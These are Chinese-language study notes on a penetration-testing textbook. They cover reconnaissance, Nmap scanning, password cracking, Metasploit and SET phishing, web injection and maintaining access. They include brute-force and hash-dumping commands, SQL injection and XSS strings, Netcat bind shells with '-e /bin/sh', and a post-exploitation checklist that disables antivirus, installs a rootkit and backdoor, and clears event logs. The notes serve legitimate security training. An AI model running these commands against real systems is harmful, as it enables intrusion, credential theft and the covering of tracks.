# 渗透测试实践指南：必知必会的工具与方法(原书第2版)

- [侦查](#侦查)
- [扫描](#扫描)
- [漏洞利用](#漏洞利用)
- [维持访问](#维持访问)

## 侦查

- 主动侦查 – 包括与目标系统的直接交互，在这个过程中，目标可能会记录下我们的IP地址及活动。
- 被动侦查 – 利用可以从网上获取的信息。

### HTTrack 网站复制机

能够创建与目标网站完全相同的脱机副本。

需要注意的是，克隆网站很容易被跟踪，同时也会被视为极具攻击性，没有事先获得授权的话，不要运用该工具。

特别关注“新闻”和“公告”之类的信息，这类报道中可能不小心泄漏出有用的信息。还要搜索目标公司挂在网上的招聘启示，之类启示经常会详细说明它们所使用的技术。

### Google指令

- site – 只显示来自某个具体网站的搜索结果
- intitle, allintitle – 搜索网页标题 – allintitle:index of
- inurl – 搜索包含某些特定字符的网站 – inurl:admin – inurl:login
- cache – 搜索快照，可能有原网站已被移除的网页和文件，还能减少在目标服务器上留下的痕迹。
- filetype – 搜索特定的文件扩展名。

推荐网站 [Google Hacking Database](https://www.exploit-db.com/)

像UseNet，Google Groups，BBS，Facebook，Twitter等地方也可收集信息（社会工程学）。

### The Harvester 挖掘并利用邮箱地址

可以快速准确地给电子邮箱及其子域名建立目录。

### Whois

获取与目标相关的具体信息，包括IP地址，公司DNS主机名以及地址和电话号码等联系信息。

特别留意DNS服务器。利用host命令将名字翻译成IP地址。

### Netcraft

搜集信息的好去处 [Netcraft](http://www.netcraft.com/)

搜索后将显示它能找到的包含搜索关键字的网址和一些有用的信息。

### Host 工具

可以把IP地址翻译成主机名，也可以吧主机名翻译成IP地址。

Host 手册和帮助文档值得阅读。

### 从DNS中提取信息

DNS服务器中包含目标内部IP地址的完整列表。

使用NS Lookup能查询DNS服务器，并可能获得DNS服务器知道的各种主机的记录。
Dig 也是从DNS提取信息的利器。

Fierce（在区域传输失败时该做什么），该脚本首先试图从指定域中完成一次区域传输，如果过程失败，Fierce将试图向目标DNS服务器发送一系列查询，对主机名进行暴力破解。这是发现附加目标的极其有效的方法。

### 从电子邮件服务器提取信息

如果目标公司拥有自己的电子邮箱服务器，就可以向目标公司发送一封附件为空的批处理文件或是想calc.exe之类的非恶意可执行文件的电子邮件，目的是让公司邮件服务器对邮件进行检查，然后发送退信。我们就可以尝试提取服务器信息了。

### MetaGooFil

用来提取元数据(metadata)，元数据被定义为关于数据的数据。

### ThreatAgent Drone 攻击

先在 [threatagent](http://www.threatagent.com/) 注册帐号。

ThreatAgent通过使用一些不同的站点，工具，和技术，创建有关目标的完整档案。

### 社会工程

攻击“人性”弱点的过程。

### 补充

工具：Maltego， Robertex

## 扫描

- 用 Ping 数据包验证系统是否正在运行
- 用 Nmap 扫描系统的端口
- 用 Nmap 脚本引擎(NSE)进一步查询目标
- 用 Nessus 扫描系统漏洞

### ping 和 ping 扫描

ping 是一种特定类型的网络数据包，叫做 ICMP 回显请求数据包，用于给计算机或网络设备上的某些特殊接口发送特定类型的网络流量。

用工具 FPing 执行 ping 扫描。

### 端口扫描

目的是为了识别在目标系统上哪些端口是开启的，哪些服务是启用的。

扫描工具：Nmap

### 使用 Nmap 进行 TCP 扫描

是端口扫描中最基础和最稳定的，完整地完成了三次握手过程。

例如：nmap -sT -p- -Pn 192.168.31.120-254 (-iL path_to_the_text_file)

### 使用 Nmap 进行 SYN 扫描

Nmap 默认的扫描方式，最常用。只完成了三次握手的前两步，速度快并且在某些情况下一定程度上隐藏了自己。

例如：nmap -sS -p- -Pn 192.168.31.120

### 使用 Nmap 进行 UDP 扫描

如果我们想要找寻基于UDP的服务，需要操控Nmap创建UDP数据包来进行扫描。

例如：nmap -sU 192.168.31.120

UDP扫描非常慢。

由于UDP协议进行通信不需要接受方做出相应，Nmap很难区分UDP端口是开启的还是扫描数据包被过滤了。为了使目标返回更有用的相应信息，我们添加 -sV 参数。通常 -sV 用于版本扫描。i启用版本扫描后，Nmap会发送额外的探测信息给每个扫描到“OPEN|FILTERED”端口。这个额外的探测信息试图通过发送特制的数据包来识别服务，往往会成功地出发目标进行响应。

### 使用 Nmap 进行 Xmas 扫描

RFC指一个文档，要么是一个注释文档，要么是关于现有的某项技术或标准的技术规格，为我们提供了大量的特定系统内部运作的细节。可以在其中查找系统的潜在弱点或漏洞。

TCP的RFC文档是这样描述的，当端口收到的数据包没有置位SYN，ACK或RST标记（Xmas扫描的数据包就是这样的）时，如果该端口是关闭的就发送RST数据包作为响应，如果是开启的就忽略。如果我们扫描的系统遵循了TCP RFC文档的建议，我们就可以发送这种非常规数据包来判断目标系统中端口的当前状态。

例如：nmap -sX -p- -Pn 192.168.31.120

注：总的来说，Xmas Tree扫描和Null扫描针对的是运行Unix和Linux系统的计算机。

### 使用 Nmap 进行 Null 扫描

很多情况下，Null扫描和Xmas Tree扫描正好相反，因为Null扫描使用没有任何标记（全空）的数据包。

目标系统对Null扫描的响应与对Xmas Tree扫描的响应完全一样。使用这两个扫描的好处是，在某些情况下它们可以绕过简单的数据包过滤和访问控制列表(ACLs)。

例如：nmap -sN -p- -Pn 192.168.31.120

### NMAP脚本引擎

NSE将Nmap的功能扩展到传统端口扫描之外。

例如：nmap –script banner 192.168.31.120

### 端口扫描总结

- “-sV”参数用于版本扫描。
- “-T”参数可以改变端口扫描速度的选项。
- “-O”参数可以用来识别操作系统。

### 漏洞扫描

工具：Nessus

[Nessus Activation Code Installation](http://static.tenable.com/documentation/Nessus_Activation_Code_Installation.pdf)

### 补充

工具：[OpenVAS](http://www.openvas.org/)

深入学习Nmap：[insecure.org](http://insecure.org/)

## 漏洞利用

简单的说，漏洞利用是获得系统控制权限的过程。

### 利用 Medusa 获得远程服务的访问权限

Medusa 是通过并行登录暴力破解的方式尝试获取远程验证服务权限的工具。

例如：medusa -h target_ip -u username -P path_to_password_dictionary -M authentication_service_to_attack

关于字典：密码字典包含了各种可能的密码组成的列表。JtR等离线密码破解工具每秒能处理几百万个密码，但是Medusa和Hydra每秒只能处理一两个密码，所以选择合适的字典很重要。

### Metasploit：用Hugh Jackman的方式入侵

基础术语：

漏洞攻击程序指的是预先打包，将被发送到远程系统的代码集。
攻击载荷也是一段代码，用于执行某些任务，比如安装软件，创建用户，开启通往目标系统的后门。

具体步骤：

- 根据Nessus扫描的结果可以找出目标的弱点和未安装的补丁
- 打开终端，启动Metasploit
- 输入”search”命令，搜索漏洞攻击程序
- 输入”use”命令，选择合适的漏洞攻击程序
- 输入”show payloads”命令，显示可用的攻击载荷
- 输入”set”命令，选择攻击载荷
- 输入”show options”，查看对目标进行漏洞攻击之前需要设置的所以选项
- 输入”set”命令，对上面所列出的选项进行设置
- 输入”exploit”命令，对目标发动漏洞攻击

常用的入侵windows攻击载荷：

Metasploit载荷名称 | 载荷描述
--- | ---
windows/adduser | 在目标计算机上的本地管理员组中创建新用户
windows/exec | 在目标计算机上执行windows二进制文件(.exe)
windows/shell_bind_tcp | 在目标计算机上启动一个命令行shell并等待连接
windows/shell_reverse_tcp | 目标计算机连回攻击者并在目标计算机上启动一个命令行shell
windows/meterpreter/bind_tcp | 目标计算机安装Meterpreter并等待连接
windows/meterpreter/reserse_tcp | 在目标计算机上安装Meterpreter然后向攻击者创建反向连接
windows/vncinject/bind_tcp | 在目标计算机上安装VNC并等待连接
windows/vncinject/reserse_tcp | 在目标计算机上安装VNC然后向目标返回VNC连接

Meterpreter：一个可用的攻击载荷，为攻击者提供了强大的命令行shell，可用来跟目标计算机进行交互。它完全在内存中运行，从不使用硬盘空间，提高了隐蔽性，有助于躲避杀毒软件和迷惑取证工具。注：Meterpreter运行时的权限与被攻击的程序是相关联的。

### John the Ripper：密码破解之王

无论我们的技术能力到了什么程度，密码似乎仍然是保护数据，限制系统访问权限的最常用的方法。

### 最基本的密码破解过程

- 定位并下载目标系统的密码散列文件
- 利用工具将散列加密过的密码转化为明文密码

### 本地密码破解

大多数系统会将加密过的密码散列保存在单一的位置。基于Windows的系统保存在一个叫SAM(安全帐号管理器)的文件里，”C:\Windows\System32\Config\”目录下。该文件有一些安全措施，操作系统启动后，SAM文件将同时被锁定，另外整个SAM文件经过加密，且不可见。所以我们要绕过这些限制，最佳方式是启动目标计算机进入到其他的操作系统，此时我们就可以访问SAM文件，当然了文件还是加密状态。进入另一个操作系统之后，首先必须挂载本地硬盘，浏览找到SAM文件，之后就可以利用Samdump2工具提取散列，输入以下命令 “ samdump2 system SAM > /tmp/hashes.txt “。

注：某些Windows系统上的原始散列可能需要一个额外的步骤。使用Bkhive工具从系统配置(Hive)中提取Syskey启动密钥(Bootkey)。先输入 “ bkhivve system sys_key.txt “提取密钥，再使用Samdump2攻击。
得到密码散列之后，就可以用John the Ripper破解了。例如：john /tmp/hashes.txt –format=nt

### 远程密码破解

在利用Metasploit获取目标上的远程shell后，运行Meterpreter对话，输入”hashdump”命令，就可以得到目标计算机的用户名和密码散列。

### 简单的Linux密码破解和权限提升

Linux系统将密码散列包含在”shadow”文件里，”/etc/shadow”，只有特权用户可以访问这个文件。但是我们可以使用一个经过编辑的密码列表 /etc/passwd，利用JtR的一个特殊功能合并 /etc/shadow 和 /etc/passwd ，这样可以输出一个包含原始散列的列表。输入命令：unshadow /etc/passwd /etc/passwd > /tmp/linux_hashes.txt 。提取成功后就可以破解了，大多数Linux使用SHA散列加密算法。

### 密码重置：破强而入

密码重置直接覆盖SAM文件，并为Windows上的任何用户创建新的密码。这一过程无需知道原本的密码，但需要获得访问这台计算机的物理权限。

使用Kali的光盘或者U盘启动目标系统，挂载含有SAM文件的系统的硬盘驱动器，然后使用”chntpw”命令重置密码。收入”chntpw -h”查看完成的选项列表和可用的参数。执行”chntpw -i /mnt/sda1/WINDOWS/system32/config/SAM”重置管理员密码。

### Wireshark：嗅探流量

嗅探即获取并查看进出某一网络流量的过程，是获取系统访问权限的有效途径。

有些很常用的协议，会在未经加密的情况下通过网络发送敏感信息，称为明文。

混杂和非混杂网络模式：

- 非混杂模式下网络接口卡只会传递指向本机地址的特定网络流量。
- 混杂模式则是强制网卡接受流入的所以数据包。

为了能顺利嗅探到目的地址最初并非指向你的计算机的流量，必须确保你的网卡已经运行在混杂模式下。

### Macof：巧妇能为无米之炊

在某些情况下，我们可以让交换机像集线器一样，向所有端口广播流量。

大多数交换机拥有并存包含MAC地址和对应端口号的匹配表的内存是有限的，通过耗尽这点内存，并用大量伪造的MAC地址对该匹配表进行泛洪攻击，就可以使交换机无法读取或访问这个表，这时交换机会简单地把流量广播到所有端口，称为“失效开放”。注意交换机也可以设置为“失效关闭”。

Dsniff工具集中有一个工具Macof，可以生成几千个随机MAC地址，对交换机进行泛洪。例如：macof -i eth0 -s 192.168.18.2

注：使用Macof会产生大量网络流量，容易被发现。

Wireshark是一款网络协议分析工具，可以快速便捷地查看并捕捉网络流量。使用之前一定要启用或至少配置一个网络接口。

### Armitage：入侵工具中的超级明星

Armitage是一个在Metasploit上运行，BUI驱动的前端程序，包含了可以用于自动化整个渗透过程的功能，只需要输入目标的IP地址。
使用时先输入“service postgresql start”启动PostgreSQL服务。

### 补充

工具：Hydra 暴力破解密码工具，RainbowCrack 利用彩虹表破解密码，命令行工具 tcpdump，开展中间人攻击的Ettercap，搜索 Exploit-DB。

学习漏洞利用技术可以从学习缓冲区溢出开始。

### 社会工程

社会工程是用于获取对组织或者单独计算机访问权限的最早技术。

社会工程工具包(SET)是一个专用于社会工程的漏洞利用框架。

### 关于SET

SET的一个旗舰级攻击向量是网络攻击向量，成功率很高，利用了可信性。

重点关注两种攻击：Java小脚本(Applet)攻击方法和“The Credential Havester”(凭据采集者)。

Java小脚本步骤：

1. 安装SET，做好与我们的配置搭配的准备（确保SET访问到互联网）
2. 注册一个看上去可信的域名
3. 想公司发送一封有可信借口的电子邮箱，其中有指向我们的恶意域名的链接
4. 得到 Shell

### 基于Web的漏洞利用

Web入侵的几个基本思路：

- 拦截离开浏览器的请求的能力。拦截代理的使用是关键，可以利用它编辑变量的值，然后发往Web应用。Web事务的核心是接受浏览器的请求并根据入站请求提供页面的应用程序。每个请求的一大部分是与请求搭配的变量，这些变量规定了返回给用户的页面。
- 寻找组成Web应用的所有网页，目录和其他文件的能力。这种活动的目标是为你提供对攻击面的深入理解，该功能由自动化的“爬虫”工具提供。
- 分析Web应用响应，检查其漏洞的能力。SQL注入，跨站脚本(XSS)和文件路径操纵攻击(目录遍历)均是利用了这些漏洞。

### 扫描Web服务器：Nikto

Nikto是一个Web服务器漏洞扫描工具，能自动扫描Web服务器上过期的没有打补丁的软件，也自动检索驻留在服务器上的危险文件。

例如：nikto -h 192.168.18.132 -p 1-1000

### W3AF：不是徒有其表

W3af是一个We资源扫描和漏洞利用工具。

### 网络爬虫：抓取目标网站

工具：Webscarab

切换到全功能模式“Use full-featured interface”，接下来使用代理功能配置浏览器，”Manual proxy configuration” > HTTP Proxy:”127.0.0.1”，Port:”8008” > 选中”Use this proxy server for all protocols”。

注：首先，使用WebScarab做为代理之前要保证它处于运行状态。第二，通过本地代理进行网上冲浪时，所有https流量都会显示无效证书错误。

### 使用Web Scarab拦截请求

在代理模式下运行Webscarab，我们能够阻止，拦截甚至改变到达浏览器之前的或离开浏览器之后的数据，操纵或查看HTTP请求与响应的能力将是严重的安全隐患。
首先配置为使用”Lite Interface”模式，在准备开始测试之前，不要选中”拦截请求“和”拦截响应“复选框，因为可能导致网站浏览速度奇慢。
查看HTTP响应和请求也可以用于发现用户名和密码，很多这样的字段都经过了Base64编码转换，需要一个工具来解码。

### 代码注入攻击

当前的Web应用程序大多采用解释性程序设计语言和用于存储信息的后台数据库的架构模式，动态地生成用户需要的数据内容。掌握注入攻击的关键就是要理解解释性语言是什么以及它是如何工作的。想目标计算机发送可操纵的输入或查询的目的是：让目标计算机执行意想不到的命令或为攻击者返回意想不到的信息。

例如：SELECT * FROM users WHERE uname = ‘admin’ and pwd = ‘’ or 1 = 1 –

### 跨站脚本：轻信网站的浏览器

跨站脚本是一个将脚本程序注入到Web应用程序中的过程。注入的脚本被保存在原有的网页中，所有访问该网页的浏览器都会运行或者处理这个脚本程序。当注入脚本实际上成为原始代码的一部分时，跨站脚本攻击就发生了。跨站脚本侧重于攻击客户端。

例如：< script> alert(“XSS Test”) < /script>

### Zed Attack Proxy：一网打尽

OWASP的ZAP是一个全功能的Web入侵工具包，提供了拦截代理，爬虫和漏洞扫描等主要功能。

使用之前必须配置浏览器使用代理，端口号为8080。

### 补充

实验环境：[WebGoat](https://www.owasp.org/index.php/Main_Page); [DVWA](http://www.dvwa.co.uk/)
工具：Burp Proxy， Paros Proxy

## 维持访问

很多的漏洞利用都是短暂的，在完成对目标系统的控制后，首要任务就是迁移shell，让它能持久地发挥作用，通常用后门来实现这一点。

### Netcat：瑞士军刀

Netcat是一个运行通信和网络流量从一台计算机流向另一台计算机的工具，是后门的首选。

Netcat以服务器模式或者客户端模式来运行。当作为客户端时，它可以通过网络连接到其他服务上去，它可以使用本地计算机上任意一个端口连接远程目标计算机上的任意端口。当作为服务器运行时，它作为一个监听者，等待接受外界传递过来的连接。

命令：nc -l -p 1337 启动Netcat并置于监听模式，等待1337端口的信息。

命令：nc 192.168.18.132 1337 使Netcat连接目标IP上的1337端口。

注：一旦关闭了Netcat连接，就需要重启Netcat程序来建立连接。如果使用Windows版本的Netcat，可以使用参数 “-L” 取代 “-l” 来保持连接状态。如果想永久性运行，需要修改windows注册表。

命令：nc -l -p 7777 > virus.exe 强制目标在7777端口监听并把接受的信息存储在”virus.exe”中。

命令：nc 172.16.45.129 7777 < virus.exe 从攻击机上传文件。

最后我们可以吧Netcat绑定在一个进程上，并使这个进程可被远程链接。使用参数 “-e” ，Netcat将执行参数后指定的任何程序，对于在目标计算机上配置一个后门shell非常有用。

linux命令：nc -l -p 12345 -e /bin/sh

windows命令：nc -L -p 12345 c:\Windows\System32\cmd.exe

### Netcat神秘的家庭成员：Cryptcat

Netcat的缺点是所有流经Netcat服务器和客户端的流量都是明文，任何查看流量或嗅探连接的人都能看到并监视到计算机之间传送的信息。而Cryptcat使用twofish来加密。

### Rootkit

Rootkit的操作是在操作系统中比较底层的内核中运行，一般用于隐藏文件或程序，并保持后门访问的隐蔽性。

注：必须确保在使用Rootkit进行渗透测试之前，客户端有权使用Rootkit。

Hacker Defender：一个强大的Rootkit。

### Rootkit的检测与防御

我们知道，为了配置和安装Rootkit，必须使用管理员权限，因此，避免Rootkit的第一步就是降低用户权限。第二，安装，使用和维护最新版的软件。第三，监控所在网络的进出流量。第四，定期对系统进行端口扫描，记录下每一个系统上开启的每一个端口。使用一些可以发现隐藏文件和Rootkit的工具，如Rootkit Revealer，vice等。

### Meterpreter：无所不能

Meterpreter基本命令：

命令 | 功能
--- | ---
cat file_name | 显示指定文件内容
clearev | 清楚目标机器应用程序，系统和安全日志中报告的所有事件
download < source_file>< destination_file> | 从目标下载指定文件到本地主机
edit | 提供一个VIM编辑器，可以对文档进行更改
execute -file_name | 运行/执行目标上的指定文件
getsystem | 命令meterpreter尝试将权限提升到最高级
hashdump | 定位和显示目标上的用户名及散列，可以复制到文本中供John the Ripper破解
idletime | 显示机器不活动的时间
keyscan_dump | 显示当前从目标计算机上捕捉的击键（必须先运行keyscan_start）
keyscan_start | 开始记录目标上的击键（为了捕捉击键，必须迁移到explorer.exe进程中）
keyscan_stop | 停止记录用户击键
kill pid_number | 停止指定进程（进程ID可以运行ps命令找到）
migrate | 将meterpreter shell移到另一个运行中的进程
ps | 打印目标上运行的所有进程的列表
screenshot | 提供来自目标机器的屏幕截图
search -f file_name | 在目标机器上搜索指定文件
sysinfo | 提供目标机器的相关系统信息
upload < source_file>< destination_file> | 从你的攻击机将指定文件上传到目标机器

一个简单的方法：

1. 进行漏洞利用，对目标使用Meterpreter攻击载荷
2. 使用”migrate”命令将Meterpreter转移到那些不为人熟知的进程中。比如服务主机(svchost.exe)
3. 使用”kell”命令禁用防病毒软件
4. 使用”shell”命令访问目标机器的命令提示符，并使用”netsh advfirewall firewall”命令更改Windows防火墙设置（使连接或者端口可以开放）
5. 在禁用防病毒的情况下，使用”upload”命令上传一个包含Rootkit和其他工具(nmap,Metasploit,John the Ripper等)
6. 用”execute -f”命令安装rootkit
7. 如果rootkit没有包含后门，用”execute -f”安装Netcat作为永久后门
8. 用”reg”命令修改注册表，确保Netcat持久化
9. 用”hashdump”命令转储密码散列，使用John破解密码
10. 用”edit”命令配置rootkit.int文件，隐藏上传的文件，后门，新打开的窗口
11. 从攻击机器建立到目标的新连接，测试上传的后门
12. 用”clearev”命令清楚事件日志
13. 攻击下一个目标

### 补充

Ncat：现代版的Netcat，是Nmap的组成部分，增加了SSL和IPV6的支持。
